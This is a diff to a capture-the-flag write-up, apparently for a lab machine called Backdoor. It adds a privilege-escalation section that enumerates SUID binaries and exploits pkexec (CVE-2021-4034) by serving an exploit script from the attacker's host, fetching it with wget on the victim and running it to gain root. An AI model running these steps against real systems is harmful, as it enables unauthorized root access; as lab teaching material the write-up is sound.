@@ -144,3 +144,42 @@ If we look for it on _searchsploit_ we will find a vulnerability with **id 50539
 If we run it and follow the instructions provided, we can get a reverse shell as _user_ and view the flag.
 
 ![whoami output](screenshots/foothold.png)
+
+## Privilege Escalation
+Once we are inside the victim's machine, we can enumerate binaries with the SUID permission set:
+```bash
+user@Backdoor:/home/user$ find / -perm -u=s 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/screen
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/pkexec
+```
+
+We can see that the binary _pkexec_ is available, which has been compromised recently under the _CVE-2021-4034_.
+There are many exploits out there, I have used [this one](https://github.com/Almorabea/pkexec-exploit).
+Now it's simply a matter of setting up a Python server so you can share the file with the victim's machine and run it.
+
+```
+$ python3 -m http.server 80
+```
+
+```
+user@Backdoor:/home/user$ wget 10.10.16.43:80/CVE-2021-4034.py
+user@Backdoor:/home/user$ python3 CVE-2021-4034.py
+```
+
+Just like that, we have become _root_:
+![Root screenshot](root.png)
